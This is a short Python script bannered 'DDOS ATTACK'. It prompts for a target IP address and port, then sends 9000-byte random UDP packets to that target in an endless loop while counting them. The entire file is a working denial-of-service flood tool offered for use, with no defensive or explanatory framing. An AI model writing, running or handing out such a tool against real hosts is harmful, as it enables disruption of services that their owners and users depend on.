import socket
import random
import os
from termcolor import colored

os.system("clear")

def banner():

	print("""
	
 ____  ____  ____  ____    ____  _____  _____  ____  ____  _  __
/  _ \/  _ \/  _ \/ ___\  /  _ \/__ __\/__ __\/  _ \/   _\/ |/ /
| | \|| | \|| / \||    \  | / \|  / \    / \  | / \||  /  |   / 
| |_/|| |_/|| \_/|\___ |  | |-||  | |    | |  | |-|||  \__|   \ 
\____/\____/\____/\____/  \_/ \|  \_/    \_/  \_/ \|\____/\_|\_\
                                                                
	
	""")

banner()

con = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

host = input(colored("Target IP address : ",'blue'))
port = int(input(colored("Port number (HTTP : 80) : ",'blue')))


package = random._urandom(9000)
time = 0

while True:
	con.sendto(package, (host,port))
	time += 1
	print(colored("packate send : ",'red'),time)
